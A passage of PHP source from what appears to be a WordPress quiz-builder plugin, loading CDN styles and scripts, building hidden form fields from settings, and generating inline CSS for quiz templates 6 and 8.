					$google_font .= '<link href="//fonts.googleapis.com/css2?family=Noto+Serif+Display:wght@400;500;600&display=swap" rel="stylesheet">';
				}
			}else{
				$google_font = '';
			}

			$cssAndJs  .= '<link href="//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
			'.$google_font.'
			<link href="//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/css/bootstrap-slider.min.css" rel="stylesheet">	
			<link href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css" rel="stylesheet">
			<link href="//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/css/bootstrap-datepicker.min.css" rel="stylesheet">
			<link href="//cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/css/intlTelInput.css" rel="stylesheet">
			<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_questions.css?'.rand(10,1000).'" rel="stylesheet">
			<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_common_backend.css?'.rand(10,1000).'" rel="stylesheet">	
			<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_common.css?'.rand(10,1000).'" rel="stylesheet">	
			<link href="'.plugin_dir_url(__FILE__).'includes/css/question_ans_layout.css?'.rand(10,1000).'" rel="stylesheet">	
			<link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css" rel="stylesheet">
			
			<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/bootstrap-slider.min.js" defer></script>

			<script  src="//cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/js/intlTelInput.js"  defer></script>
			<script  src="//cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.11/jquery.mask.js"  defer></script>

			<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/js/bootstrap-datepicker.min.js" defer></script>
			<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjs/9.4.4/math.js" defer></script>	 
			<script  src="//code.jquery.com/ui/1.12.1/jquery-ui.js?'.rand(10,1000).'" defer></script>
			<script  src="//cdnjs.cloudflare.com/ajax/libs/jqueryui-touch-punch/0.2.3/jquery.ui.touch-punch.min.js"  defer></script>
			<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_frontend.js?'.rand(10,1000).'"></script>
			<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_poll.js?'.rand(10,1000).'"></script>
			<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_frontend_fe.js?'.rand(10,1000).'"></script>
			<script  src="'.plugin_dir_url(__FILE__).'includes/js/chart_lib.js?'.rand(10,1000).'"></script>';
			
		}
		 

		$cssAndJsCornerPopup = '';
		$cssAndJsCornerPopup1 = '';
		if($quiz_display == 'corner_popup'){
			$cssAndJsCornerPopup = $cssAndJs;
			$cssAndJsCornerPopup1 = $includejscss;
			$cssAndJs = '';
			$includejscss = '';
		} 
		$temp5FullWidthClass = ''; 
		if($template_num == 'template5'){
		$temp5FullWidthClass = 'sqb_template5-fullWidth';
		}
		
		$cat_total_text = 'Total: ';
		if($quiz_type == 'scoring'){
			$cat_total_text = sqbGetValidSettingsByKey('category_scoring_text1');			
			if(!isset($cat_total_text)){
				$cat_total_text = 'Total Score: ';
			}

		}else if($quiz_type == 'assessment'){
			$cat_total_text = sqbGetValidSettingsByKey('category_assessment_text1');
			if(!isset($cat_total_text)){
				$cat_total_text = 'Total Correct Answers: ';
			}
		}

		$invalid_date_text = sqbGetValidSettingsByKey('invalid_date_text');
			if(!isset($invalid_date_text)){
				$invalid_date_text = 'Invalid Date ';
			}

		$custom_date_field_data = sqbGetValidSettingsByKey('custom_date_field_data');
			if(!isset($custom_date_field_data)){
				$custom_date_field_data = 'Invalid Date ';
			}
		$hidden_fields = '<input type="hidden" id="outcome_advanced_rule_id" name="outcome_advanced_rule_id" value="0">';
		$hidden_fields .= '<input type="hidden" id="invalid_date_text" name="invalid_date_text" value="'.$invalid_date_text.'">';

		$pdf_download_success = sqbGetValidSettingsByKey('pdf_download_success');
		if(!isset($pdf_download_success)){
			$pdf_download_success = 'pdf_download_success';
		}

		$hidden_fields .= '<input type="hidden" id="pdf_download_success" name="pdf_download_success" value="'.$pdf_download_success.'">';

		$pdf_downloading_text = sqbGetValidSettingsByKey('pdf_downloading_text');
		if(!isset($pdf_downloading_text)){
			$pdf_downloading_text = 'pdf_downloading_text';
		}
		$hidden_fields .= '<input type="hidden" id="pdf_downloading_text" name="pdf_downloading_text" value="'.$pdf_downloading_text.'">';

		$hidden_fields .= '<input type="hidden" name="weighted_score" value="'.$weighted_score.'">';
		$hidden_fields .= '<input type="hidden" id="custom_date_field_data" name="custom_date_field_data" value="'.$custom_date_field_data.'">';
		$hidden_fields .= '<input type="hidden" name="sqb_cat_total_text" value="'.$cat_total_text.'">';
		$hidden_fields .= '<input type="hidden" name="sqb_quiz_category_enable" value="'.$quiz_category_enable.'">';

		$getOutcomeScreenChartsSettings = $sqbObj->getOutcomeScreenChartsSettings();
		$chartsSettings = explode('|',$getOutcomeScreenChartsSettings);
		
		$chart_in_percent_checked = "Y";
		if(isset($chartsSettings) && count($chartsSettings) > 0){
			if(!empty($chartsSettings[17])){
				$chart_in_percent_checked = urldecode($chartsSettings[17]);
				if($chart_in_percent_checked == "N"){
					$chart_in_percent_checked = "N";
				}
			}
		}

		$hidden_fields .= '<input type="hidden" id="sqb_quiz_category_per" value="'.$chart_in_percent_checked.'">';
		$hidden_fields .= "<input type='hidden' name='category_list_json' value='".$category_list_json."'>";
		$hidden_fields .= "<input type='hidden' name='category_result_list_json' value=''>";
		$hidden_fields .= "<input type='hidden' id='SQBPreview' name='SQBPreview' value='".$SQBPreview."'>";
		$hidden_fields .= "<input type='hidden' id='quiz_recommendation_enable' name='quiz_recommendation_enable' value='".$quiz_recommendation_enable."'>";
		$hidden_fields .= "<input type='hidden' id='double_optin' name='double_optin' value='".$double_optin."'>"; 
  	
  		$rtl_class = (get_option('sqb_rtl_mode') == 'Y') ? 'sqb-rtl' : '';

		$output .=  $includejscss.$cssAndJs.'<div class="sqb_quiz_container '.$temp5FullWidthClass.' '.$enable_branching_class.' quiz_type_'.$quiz_type.' '.$rtl_class.'" id="sqb_quiz_builder">'.$hidden_fields.'<input type="hidden" id="sqb_quiz_type" name="sqb_quiz_type" value="'.$quiz_type.'" /><input type="hidden" id="quizId" name="quizId" value="'.$id.'" /><input type="hidden" id="sqb_ajaxurl" name="sqb_ajaxurl" value="'.$ajaxurl.'" /><input type="hidden" id="show_next_button" value="'.$show_next_button.'"> '.$display_correctans_html.$getQuizData.'</div>	
		<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_frontend.css?'.rand(10,1000).'" rel="stylesheet">';
		$output .= $funnel_connection_array;
		 
		//Get answer style
		$imgbg_postion ='center top';
		
		
		if($template_num == 'template8'){
			
			$answer_border_width ='2px';
			$answer_border_style ='solid';
			$answer_border_color ='#00c1b7';
			$answer_border_shadow_color ='#00c1b7';
			
			$background_width = '1800px';
			$background_height ='150px';
			$background_color ='#eff3f5';
			
			$skip_button_width ='200px';
			$skip_button_height ='50px';
			$skip_button_background_color ='#00c1b7';
			
			$continue_button_width ='200px';
			$continue_button_height ='50px';
			$continue_button_background_color ='#00c1b7';
			
			if(!empty($customizer_style_settings["background_height"])){
				$background_height = $customizer_style_settings["background_height"];
			}
			if(!empty($customizer_style_settings["background_width"])){
				$background_width = $customizer_style_settings["background_width"];
			}
			if(!empty($customizer_style_settings["outcome_tag_width"])){
				$outcome_tag_width = $customizer_style_settings["outcome_tag_width"];
			}
			if(!empty($customizer_style_settings["background_color"])){
				$background_color = $customizer_style_settings["background_color"];
			}
			if(!empty($customizer_style_settings["answer_border_width"])){
				$answer_border_width = $customizer_style_settings["answer_border_width"];
			}
			if(!empty($customizer_style_settings["answer_border_style"])){
				$answer_border_style = $customizer_style_settings["answer_border_style"];
			}
			if(!empty($customizer_style_settings["answer_border_color"])){
				$answer_border_color = $customizer_style_settings["answer_border_color"];
			}
			if(!empty($customizer_style_settings["answer_border_shadow_color"])){
				$answer_border_shadow_color = $customizer_style_settings["answer_border_shadow_color"];
			}
			if(!empty($customizer_style_settings["skip_button_width"])){
				$skip_button_width = $customizer_style_settings["skip_button_width"];
			}
			if(!empty($customizer_style_settings["skip_button_height"])){
				$skip_button_height = $customizer_style_settings["skip_button_height"];
			}
			if(!empty($customizer_style_settings["skip_button_background_color"])){
				$skip_button_background_color = $customizer_style_settings["skip_button_background_color"];
			}
			if(!empty($customizer_style_settings["continue_button_width"])){
				$continue_button_width = $customizer_style_settings["continue_button_width"];
			}
			if(!empty($customizer_style_settings["continue_button_height"])){
				$continue_button_height = $customizer_style_settings["continue_button_height"];
			}
			if(!empty($customizer_style_settings["continue_button_background_color"])){
				$continue_button_background_color = $customizer_style_settings["continue_button_background_color"];
			}
			if(!empty($customizer_style_settings["startscreen_button_background_color"])){
				$startscreen_button_background_color = $customizer_style_settings["startscreen_button_background_color"];
			}

			if(!empty($customizer_style_settings["background_height_v2"])){
				$background_height_v2 = $customizer_style_settings["background_height_v2"];
			}

			if(!empty($customizer_style_settings["background_height_unit_v2"])){
				$background_height_unit_v2 = $customizer_style_settings["background_height_unit_v2"];
			}

			$answer_border_hover_color = '';
			$answer_border_hover_width = '';
			$template8_background_image ='';
			$sqb_start_screen_background_image ='';	
			$template8_bg_img_opacity ='0.9';
			if(!empty($customizer_style_settings["answer_border_hover_width"])){
				$answer_border_hover_width = $customizer_style_settings["answer_border_hover_width"];
			}
			if(!empty($customizer_style_settings["answer_border_hover_color"])){
				$answer_border_hover_color = $customizer_style_settings["answer_border_hover_color"];
			}

			if(!empty($customizer_style_settings["template8_background_image"])){
				$template8_background_image = $customizer_style_settings["template8_background_image"];
				$sqb_start_screen_background_image = 'sqb_start_screen_background_image';
			}
			if(!empty($customizer_style_settings["template8_bg_img_opacity"])){
				$template8_bg_img_opacity = $customizer_style_settings["template8_bg_img_opacity"];
			}


			$min_height_v2 = @$background_height_v2.''.@$background_height_unit_v2;
			


			$get_settings_rgb = $sqbObj->getCustomizerStyles();
			if(!empty($get_settings_rgb)){
				$get_settings_rgb = explode('|',$get_settings_rgb);
			}
			

			$answer_background_rgb = !empty($get_settings_rgb[0]) ? $get_settings_rgb[0] : '';



			$get_settings12 = $sqbObj->getTransparentBackgroundSettings();
			

			if($sqbObj->getTransparentBackgroundSettings() != ''){

				$get_settings = $sqbObj->getTransparentBackgroundSettings();

				$get_details = explode("|",$get_settings);

				$hover_color = @$get_details[6];
				$hover_text_color = @$get_details[13];
				$hover_opacity = @$get_details[7];
				$imgbg_postion = @$get_details[8];
			}

			$answer_background_setting1 = sqbGetValidSettingsByKey('answer_background');

			
			$answer_background_setting = explode('||' , $answer_background_setting1);
			
			

			$rgb = sqb_hex2rgba($hover_color, $hover_opacity);
			$answer_background = $rgb.'||#000000||#e5f1ff||#00bcd4||#ff5757';

			if($answer_background == ""){
				$answer_background = '#4a689a||#ffffff||#e5f1ff||#00bcd4||#ff5757';
			}

			//echo $answer_background ;
			$answer_background = explode('||' , $answer_background);



			$answer_background_0 = '';
		    if(isset($answer_background[0])){
				$answer_background_0 = $answer_background[0];
			}
			
			$answer_background_1 = '';
		    if(isset($answer_background[1])){
				$answer_background_1 = $answer_background[1];
				}

			$settings_data = "<style>
			:root{
			  --template8-answerbox-brorder-width: $answer_border_width;
			  --template8-answerbox-brorder-hover-width: $answer_border_hover_width;
			  --template8-answerbox-brorder-style: $answer_border_style; 
			  --template8-answerbox-brorder-color:$answer_border_color;
			  --template8-answerbox-brorder-hover-color:$answer_border_hover_color;
			  --template8-answerbox-shadow-color: $answer_border_shadow_color;
			  
			  --template8-skip-btn-bg-color: $skip_button_background_color;
			  --template8-skip-btn-width: $skip_button_width;
			  --template8-skip-btn-height: $skip_button_height;
				  
			  --template8-continue-btn-bg-color: $continue_button_background_color;
			  --template8-continue-btn-width: $continue_button_width;
			  --template8-continue-btn-height: $continue_button_height;
				 
			  --template8-startscreen-continue-btn-bg-color: ".@$startscreen_button_background_color.";
			  --template8-startscreen-continue-btn-shadow-color: ".@$startscreen_button_background_color.";
				  
			  --template8-resultscreen-continue-btn-bg-color: #00C1B7;
			  --template8-resultscreen-continue-btn-shadow-color: #00C1B7;
				  
			  --template8-optinscreen-continue-btn-bg-color: #00C1B7;
			  --template8-optinscreen-continue-btn-shadow-color: #00C1B7;
			}
			
			body .sqb_quiz_container_outer.template_num_template8:not(.popup_popup_sqb) .quiz_outer_fe.show_cls  { background-color:$background_color !important;
			padding-top:$background_height; padding-bottom:$background_height;max-width:$background_width; min-height: $min_height_v2; display: flex!important;flex-direction: column;flex-wrap: nowrap;justify-content: center;align-items: center;
			}
			body .sqb_quiz_container_outer.template_num_template8 .quiz_start_template_outer.sqb_start_screen_background_image, body .sqb_quiz_container_outer.template_num_template8 .quiz_result_template_outer.sqb_start_screen_background_image, body .sqb_quiz_container_outer.template_num_template8  .quiz_quesans_template_outer.sqb_start_screen_background_image,	body .sqb_quiz_container_outer.template_num_template8 .quiz_optin_template_outer.sqb_start_screen_background_image,	body .sqb_quiz_container_outer.template_num_template8 .quiz_firstname_template_outer.sqb_start_screen_background_image { background-image:$template8_background_image; !important; background-repeat: no-repeat !important;background-position:center center !important; background-size:cover !important;}';
			
			body .quiz_quesans_template_outer.ques_temp_template8.modal_popup .Quiz-Template.outer-style8.show_cls  { 
			padding-top:$background_height; padding-bottom:$background_height;max-width:$background_width; min-height: $min_height_v2; display: flex!important;flex-direction: column;flex-wrap: nowrap;justify-content: center;align-items: center;
			}

			body .quiz_quesans_template_outer.ques_temp_template8.modal_popup .Quiz-Template.outer-style8,
			body .quiz_optin_template_outer.modal_popup .Quiz-Optin-Template.outer-style8,
			body .quiz_result_template_outer.modal_popup .result_temp_outer.outer-style8, body .sqb_quiz_container_outer.template_num_template8:not(.popup_popup_sqb) .Quiz-Template2.start_temp_outer.quiz_comon_template.outer-style8
			{ background-color:$background_color !important; }


			body .quiz_quesans_template_outer.ques_temp_template8.modal_popup.sqb_start_screen_background_image .Quiz-Template.outer-style8,
			body .quiz_optin_template_outer.modal_popup.sqb_start_screen_background_image .Quiz-Optin-Template.outer-style8,
			body .quiz_result_template_outer.modal_popup.sqb_start_screen_background_image .result_temp_outer.outer-style8,
			body .sqb_quiz_container_outer .quiz_firstname_template_outer.sqb_start_screen_background_image.modal_popup .modal_pop_inn
			{ background-image:$template8_background_image !important; background-repeat: no-repeat !important;background-position:center center !important; background-size:cover !important;} 

			.quiz_quesans_template_outer .Quiz-Template.outer-style8 { max-width:100%; }
			.quiz_quesans_template_outer .Quiz-Template.outer-style8 .progress { max-width: 750px; margin-left: auto; margin-right: auto; width: 100%; }


			/* Poll background */
			/* #sqb_quiz_builder.quiz_type_poll .Quiz-Template.outer-style8 .question_add_answer_outer_div.answer_container .sqb_ans_item_outer .sql_ans_text *, #sqb_quiz_builder.quiz_type_poll .Quiz-Template.outer-style8 .question_add_answer_outer_div.answer_container .sqb_ans_item_outer .sqb_ans_item *{
				     background: $answer_background_rgb !important;
			}
			#sqb_quiz_builder.quiz_type_poll .Quiz-Template.outer-style8 .question_add_answer_outer_div.answer_container .sqb_ans_item_outer {
			    background: $answer_background_rgb !important;
			    box-shadow: 5px 0px 0 0 #3f51b5 inset;

			}

			#sqb_quiz_builder.quiz_type_poll .Quiz-Template.outer-style8 .question_add_answer_outer_div.answer_container .sqb_ans_item_outer .sql_ans_text {
			    background: $answer_background_rgb !important;
			} */


			/* Poll hover background */
			/* #sqb_quiz_builder.quiz_type_poll .Quiz-Template.outer-style8 .question_add_answer_outer_div.answer_container .sqb_ans_item_outer:hover .sql_ans_text *, #sqb_quiz_builder.quiz_type_poll .Quiz-Template.outer-style8 .question_add_answer_outer_div.answer_container .sqb_ans_item_outer:hover .sqb_ans_item *{
				     background: $hover_color !important;
				}
				#sqb_quiz_builder.quiz_type_poll .Quiz-Template.outer-style8 .question_add_answer_outer_div.answer_container .sqb_ans_item_outer:hover {
				    background: $hover_color !important;
				    box-shadow: 5px 0px 0 0 #3f51b5 inset;

				}

				#sqb_quiz_builder.quiz_type_poll .Quiz-Template.outer-style8 .question_add_answer_outer_div.answer_container .sqb_ans_item_outer .sql_ans_text:hover {
				    background: $hover_color !important;
				} */


			</style>";


		}/*else if($template_num != 'template6'){
			$settings_data =getStyleForAnswer();			
		}*/else if($template_num == 'template6' || $quiz_type == 'poll'){
			if($sqbObj->getTransparentBackgroundSettings() != ''){

				$get_settings = $sqbObj->getTransparentBackgroundSettings();

				$get_details = explode("|",$get_settings);


				$hover_color = $get_details[6];
				$hover_text_color = @$get_details[13];
				$hover_opacity = @$get_details[7];
				$imgbg_postion = $get_details[8];

				$focus_mode_enabled = !empty($get_details[15]) ? $get_details[15] : '';
				if($focus_mode_enabled = 'Y'){
					$focus_mode_enabled = 'focus_mode_enabled';
				}
				$template6_background_image_opacity = !empty($get_details[14]) ? $get_details[14] : '';
				$template6_answer_border_color = !empty($get_details[16]) ? $get_details[16] : '';
				$template6_answer_border_hover_color = !empty($get_details[17]) ? $get_details[17] : '';
				$template6_answer_border_width = !empty($get_details[18]) ? $get_details[18] : '';
			}
			
				$answer_background_setting1 = sqbGetValidSettingsByKey('answer_background');


				$answer_background_setting = explode('||' , $answer_background_setting1);
				
				$rgb = sqb_hex2rgba($hover_color, $hover_opacity);
				$answer_background = $rgb.'||#000000||#e5f1ff||#00bcd4||#ff5757';

				if($answer_background == ""){
					$answer_background = '#4a689a||#ffffff||#e5f1ff||#00bcd4||#ff5757';
				}

				//echo $answer_background ;
				$answer_background = explode('||' , $answer_background);
				
				$get_settings_rgb = $sqbObj->getCustomizerStyles();
				if(!empty($get_settings_rgb)){
					$get_settings_rgb = explode('|' , $get_settings_rgb);
					$bg_color = $get_settings_rgb[0];
				}
				
				
				$answer_background_0 = '';
			    if(isset($answer_background[0])){
					$answer_background_0 = $answer_background[0];
				}
				
				$answer_background_1 = '';
			    if(isset($answer_background[1])){
					$answer_background_1 = $answer_background[1];
				}
				
				$answer_background_3 = '';
			    if(isset($answer_background_setting[3])){
					$answer_background_3 = $answer_background_setting[3];
				}
				
				$answer_background_4 = '';
			    if(isset($answer_background_setting[4])){
					$answer_background_4 = $answer_background_setting[4];
				}
				
				$answer_background_2 = '';
			    if(isset($answer_background[2])){
					$answer_background_2 = $answer_background[2];
				}

			    if($hover_text_color == ''){
					$hover_text_color = $answer_background_1;
				}
				
				/* if(isset($_GET['dev'])){
					print_r($answer_background);
					exit;
				}*/
				
				if (isset($template6_answer_border_hover_color) && $template6_answer_border_hover_color != '') {
					$template6_answer_border_hover_color_with_img = $template6_answer_border_hover_color;
				}else{
					$template6_answer_border_hover_color_with_img = $answer_background_0;
				}
				$settings_data ='
				<style>	 

				:root{
					--template6_background_image_opacity: '.$template6_background_image_opacity.';
					--template6_answer_border_color: '.$template6_answer_border_color.';
					--template6_answer_border_hover_color: '.$template6_answer_border_hover_color.';
					--template6_answer_border_width: '.$template6_answer_border_width.'px;
				}

				#sqb_quiz_builder .question_add_answer_outer_div:not(.image_option_has) .sqb_ans_item:not(.ans_type_numeric_text ) .sql_ans_text {
				color:'.$answer_background_1.';
			}	


			#sqb_quiz_builder:not(.quiz_type_poll) .question_add_answer_outer_div:not(.image_option_has) .sqb_ans_item:not(.ans_type_numeric_text ):hover .sql_ans_text *{ color:'.$hover_text_color.'!important; }

			#sqb_quiz_builder:not(.quiz_type_poll) .answer_container.grid-layout-active .sqb_ans_item_outer .sqb_ans_item{ margin-bottom:0!important;}

			html body div #sqb_quiz_builder.quiz_type_poll .Quiz-Template:not(.outer-style8) .answer_container:not(.image_option_has) .sqb_ans_item_outer.single_cls .sqb_ans_item .sqb_ans_item_inner .sql_ans_text:hover, #sqb_quiz_builder.quiz_type_poll .answer_container .sqb_ans_item_outer.single_cls.sqb_ans_selected .sqb_ans_item .sqb_ans_item_inner .sql_ans_text,#sqb_quiz_builder.quiz_type_poll .poll-quiz-main:not(.quiz_poll_results) .answer_container .sqb_ans_item_outer.single_cls.sqb_ans_selected .sqb_ans_item,
#sqb_quiz_builder.quiz_type_poll .poll-quiz-main:not(.quiz_poll_results) .answer_container .sqb_ans_item_outer.single_cls:hover .sqb_ans_item, #sqb_quiz_builder.quiz_type_poll .quiz_outer_fe .question_add_answer_outer_div.image_option_has .sqb_ans_item:hover .sql_ans_text, #sqb_quiz_builder.quiz_type_poll .Quiz-Template:not(.outer-style8) .answer_container .sqb_ans_item_outer.single_cls.sqb_ans_selected .sqb_ans_item .sqb_ans_item_inner .sql_ans_text, #sqb_quiz_builder.quiz_type_poll .quiz_outer_fe .question_add_answer_outer_div.image_option_has.one-in-a-row .sqb_ans_item:hover{background: '.$answer_background_0.' !important; box-shadow: 5px 0px 0 0 #3f51b5 inset;}

			#sqb_quiz_builder .Quiz-Template-overflow .answer_container .multiple_correct_checkbox.sqb_ans_item_outer.multiple_cls.sqb_withoutradio.sqb_ans_selected, .quiz-slide-animation .Quiz-Template-overflow .answer_container .multiple_correct_checkbox.sqb_ans_item_outer.multiple_cls.sqb_withoutradio.sqb_ans_selected .sqb_ans_item *, .template_num_template6 #sqb_quiz_builder .Quiz-Template-overflow .answer_container:not(.question_type_slider_has):not(.image_option_has) .multiple_cls.sqb_ans_selected .sqb_ans_item,  #sqb_quiz_builder .Quiz-Template-overflow .answer_container:not(.question_type_slider_has) .sqb_ans_selected .sqb_ans_item *  {    background-color: '.$answer_background_0.' !important;}
				.question_add_answer_outer_div.grid-layout-active.layout-three-in-row-active:not(.image_option_has) .sqb_ans_item, .question_add_answer_outer_div:not(.image_option_has) .sqb_ans_item{
				background-color: '.$answer_background_2.';
				} 

				#sqb_quiz_builder.quiz_type_poll .Quiz-Template:not(.outer-style8) .answer_container .sqb_ans_item_outer.multiple_cls{
				    border-color: '.@$bg_color.';
				    background-color: '.@$bg_color.';
				}

				.sqb_quiz_container_outer .quiz_type_poll .Quiz-Template-outer .Quiz-Template:not(.outer-style8) .quiz_poll_results .answer_container .sqb_ans_item_outer.multiple_cls:hover {
				    background-color: '.$bg_color.' !important;
				    box-shadow: none;
				}

				.sqb_quiz_container_outer .quiz_type_poll .Quiz-Template-outer  .Quiz-Template:not(.outer-style8) .answer_container .sqb_ans_item_outer.multiple_cls:hover{
				    background-color: '.$answer_background_0.' !important;
				}


				.question_add_answer_outer_div:not(.image_option_has) .sqb_ans_item_outer.multiple_cls.sqb_ans_selected .sqb_ans_item  *, .question_add_answer_outer_div:not(.image_option_has):not(.question_type_slider_has ) .sqb_ans_item_outer.sqb_ans_selected.single_cls .sqb_ans_item *{color:'.$answer_background_1.' !important;}
				.single_fillin_text .sqb_ans_item_outer.multiple_cls.sqb_ans_selected .sqb_ans_item  *, .single_fillin_text  .sqb_ans_item_outer.sqb_ans_selected.single_cls .sqb_ans_item *{color:#333 !important;}
				.answer_container.grid-layout-active:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer, .answer_container:not(.image_option_has):not(.grid-layout-active):not(.question_type_slider_has) .sqb_ans_item_outer .sqb_ans_item {   
				background-color: '.$answer_background_2.'; 
				}
				.template_num_template6 .answer_container:not(.image_option_has):not(.question_type_slider_has) .sqb_ans_item_outer:not(.text_cls):hover .sqb_ans_item:not(.matching-answer-outer):not(.ans_type_height_weight){background-color: '.$answer_background_0.' !important;color: '.$answer_background_1.' !important;}
				
				.template_num_template6 #sqb_quiz_builder .Quiz-Template-overflow .answer_container.one-in-a-row.image_option_has .multiple_correct_checkbox.sqb_ans_item_outer.multiple_cls.sqb_withoutradio.sqb_ans_selected .sqb_ans_item, .template_num_template6 .question_add_answer_outer_div:not(.question_type_slider_has):not(.grid-layout-active) .sqb_ans_item_outer:not(.text_cls) .sqb_ans_item:(.matching-answer-outer):hover, html body div.template_num_template6 #sqb_quiz_builder:not(.quiz_type_poll) .quiz_quesans_template_outer:not(.show_cls_poll) .question_add_answer_outer_div:not(.question_type_slider_has):not(.grid-layout-active) .sqb_ans_item_outer.single_cls .sqb_ans_item:hover {background-color: '.$answer_background_0.' !important;color: '.$answer_background_1.' !important;}

				html body .sqb_quiz_container_outer.template_num_template6 #sqb_quiz_builder .grid-layout-active.image_option_has.question_add_answer_outer_div.image_option_has.question_add_answer_outer_div .sqb_ans_item_outer:hover,
				html body .template_num_template6 .sqb_quiz_container_outer #sqb_quiz_builder .grid-layout-active.image_option_has.question_add_answer_outer_div.image_option_has.question_add_answer_outer_div .sqb_ans_item_outer:hover {
					    box-shadow: '.$template6_answer_border_hover_color_with_img.' 0px 0px 0px 4px inset;
					}

				html body .sqb_quiz_container_outer.template_num_template6 #sqb_quiz_builder .grid-layout-active.image_option_has.question_add_answer_outer_div.image_option_has.question_add_answer_outer_div .sqb_ans_item_outer:hover .sqb_ans_item,
				html body .template_num_template6 .sqb_quiz_container_outer #sqb_quiz_builder .grid-layout-active.image_option_has.question_add_answer_outer_div.image_option_has.question_add_answer_outer_div .sqb_ans_item_outer:hover .sqb_ans_item {
				    border-color: '.$template6_answer_border_hover_color_with_img.'!important;
				    background-color: '.$answer_background_0.'!important; 
				}

				

				html body .sqb_quiz_container_outer.template_num_template6 #sqb_quiz_builder .grid-layout-active.image_option_has.question_add_answer_outer_div.image_option_has.question_add_answer_outer_div .sqb_ans_item_outer:hover,
				html body .template_num_template6 .sqb_quiz_container_outer #sqb_quiz_builder .grid-layout-active.image_option_has.question_add_answer_outer_div.image_option_has.question_add_answer_outer_div .sqb_ans_item_outer:hover{ background-color: '.$answer_background_0.'!important;  }

				.template_num_template6 .question_add_answer_outer_div:not(.question_type_slider_has) .sqb_ans_item_outer:not(.text_cls) .sqb_ans_item:hover .sql_ans_text {background-color: '.$answer_background_0.' !important;color: '.$answer_background_1.' !important;}
				
				.ans_in_resultpage.incorrect_ans_div, .ans_in_resultpage.correct_ans_div {background:  '.$answer_background_4.' !important; }
				.ans_in_resultpage.correct_ans_div {background:  '.$answer_background_3.' !important; }
				.ans_in_resultpage.correct_ans_div.freetext_div {background: #555 !important; }
				 .template_num_template6 .question_add_answer_outer_div:not(.question_type_slider_has):not(.date_cls) .sqb_ans_item:hover, 
.template_num_template6  .question_add_answer_outer_div:not(.question_type_slider_has) .sqb_ans_item:hover *,
 .template_num_template6 .question_add_answer_outer_div:not(.question_type_slider_has):not(.template_num_template6 .question_add_answer_outer_div:not(.date_cls) .addselected *,  
 .template_num_template6  .question_add_answer_outer_div:not(.question_type_slider_has) .sqb_ans_selected .sqb_ans_item, 
 .template_num_template6 .question_add_answer_outer_div:not(.question_type_slider_has):not(.date_cls) .sqb_ans_selected .sqb_ans_item *, 
.template_num_template6  .answer_container.grid-layout-active:not(.question_type_slider_has) .sqb_ans_item_outer:hover,
 .template_num_template6  #sqb_quiz_builder .question_container.single_fillin_text .sqb_ans_item:not(.ans_type_numeric_text):hover input,
.template_num_template6    #sqb_quiz_builder .question_container.single_fillin_text .sqb_ans_item:hover textarea, 
.template_num_template6  .question_add_answer_outer_div:not(.question_type_slider_has) .sqb_ans_item_outer.multiple_cls.sqb_ans_selected,
 .template_num_template6   .answer_container.grid-layout-active .sqb_ans_item_outer.single_cls.sqb_ans_selected, 
  .template_num_template6  .answer_container:not(.image_option_has):not(.grid-layout-active):not(.question_type_slider_has) .sqb_ans_item_outer:hover .sqb_ans_item {
   background-color: '.$answer_background_0.' !important;
				color: '.$answer_background_1.' !important;
}
.question_add_answer_outer_div:not(.question_type_slider_has) .sqb_ans_item:hover *{background-color: '.$answer_background_0.' !important;color: '.$answer_background_1.' !important;}

 
				
		.quiz-slide-animation .Quiz-Template:not(.outer-style7) .Quiz-Template-overflow  .answer_container .sqb_ans_item_outer:not(.matrix_cls):not(.slider_cls):not(.weight_and_height_cls):hover ,
		.quiz-slide-animation .Quiz-Template:not(.outer-style7) .Quiz-Template-overflow  .answer_container .sqb_ans_item_outer.sqb_ans_selected:not(.matrix_cls):not(.slider_cls) {-webkit-box-shadow: inset 0 0 0 2px  '.$answer_background_0.', 2px 4px 7px rgb(0 0 0 / 15%);box-shadow: inset 0 0 0 2px  '.$answer_background_0.', 2px 4px 7px rgb(0 0 0 / 15%);}
		.quiz-slide-animation .Quiz-Template-overflow  .answer_container .sqb_ans_item_outer.sqb_ans_selected:not(.matrix_cls):not(.slider_cls):after {border-color:'.$answer_background_0.';}
			 .sqb_quiz_container_outer #sqb_quiz_builder .single_fillin_text .sqb_ans_item:not(.ans_type_numeric_text) , .sqb_quiz_container_outer #sqb_quiz_builder .single_fillin_text .sqb_ans_item_outer:not(.numeric_text_cls):hover .sqb_ans_item ,  .single_fillin_text .answer_container:not(.image_option_has):not(.question_type_slider_has):not(.grid-layout-active) .sqb_ans_item_outer:hover .sqb_ans_item {
		    background-color: transparent !important;
		}
